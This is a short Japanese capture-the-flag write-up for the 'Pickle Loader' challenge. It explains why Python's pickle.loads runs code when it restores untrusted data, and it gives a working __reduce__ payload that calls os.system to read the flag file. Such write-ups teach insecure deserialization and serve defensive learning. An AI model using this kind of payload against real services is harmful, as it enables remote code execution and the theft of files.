# Pickle Loader

https://alpacahack.com/daily/challenges/pickle-loader

## 問題の概要

Pickle 形式でシリアライズされたデータを Hex 形式で入力すると `pickle.loads` で復元される Python プログラムが動いています。

フラグは `/flag-{md5sum}.txt` に配置されています。

## 解法

Pickle は JSON のようにデータの内容を書き出したものというより、オブジェクトを復元するための命令列のようなものです。
このため、Pickle 形式でシリアライズされたデータを復元する際に任意のコードを実行させることができます。

例えば、クラスの `__reduce__` メソッドを定義することでオブジェクトの復元方法をカスタマイズすることができます。

```python
import os
import pickle

class A:
    def __reduce__(self):
        return (os.system, ("cat /flag*.txt",))

print(pickle.dumps(A()))
```

この Pickle データを `pickle.loads` で復元すると、`os.system("cat /flag*.txt")` が実行され、フラグの内容が表示されます。
